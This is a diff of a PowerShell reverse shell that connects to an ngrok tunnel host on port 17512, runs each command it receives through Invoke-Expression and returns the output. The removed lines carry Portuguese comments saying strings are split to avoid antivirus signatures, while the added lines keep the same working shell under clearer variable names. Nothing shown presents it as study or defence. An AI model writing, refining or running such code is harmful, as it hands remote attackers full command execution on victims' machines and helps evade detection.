@@ -1,29 +1,21 @@
-# Define o alvo e porta de forma dividida para evitar assinatura
-$h = ('0' + '.tcp.sa.ngrok.io')
-$p = 17512
+$host = '0.tcp.sa.ngrok.io'
+$port = 17512
 
-# Cria o socket TCP
-$c = New-Object ("System" + ".Net.Sockets.TCPClient") $h, $p
-$s = $c.GetStream()
+$client = New-Object System.Net.Sockets.TcpClient($host, $port)
+$stream = $client.GetStream()
+$encoding = [System.Text.Encoding]::ASCII
+$buffer = New-Object Byte[] 2048
 
-# Buffer para dados recebidos
-[byte[]]$b = 0..1023 | % { 0 }
-
-# Codificação ASCII
-$e = [System.Text.Encoding]::ASCII
-
-# Executa loop de leitura
-while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
-    $cmd = $e.GetString($b, 0, $r)
+while (($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $data = $encoding.GetString($buffer, 0, $read)
     try {
-        $res = Invoke-Expression $cmd 2>&1 | Out-String
+        $result = Invoke-Expression $data 2>&1 | Out-String
     } catch {
-        $res = $_.Exception.Message
+        $result = $_.Exception.Message
     }
-    $res += "`nPS> " + (Get-Location).Path + "`n"
-    $out = $e.GetBytes($res)
-    $s.Write($out, 0, $out.Length)
+    $result += "`nPS> " + (Get-Location).Path + "`n"
+    $response = $encoding.GetBytes($result)
+    $stream.Write($response, 0, $response.Length)
 }
 
-# Encerra a conexão
-$c.Close()
+$client.Close()
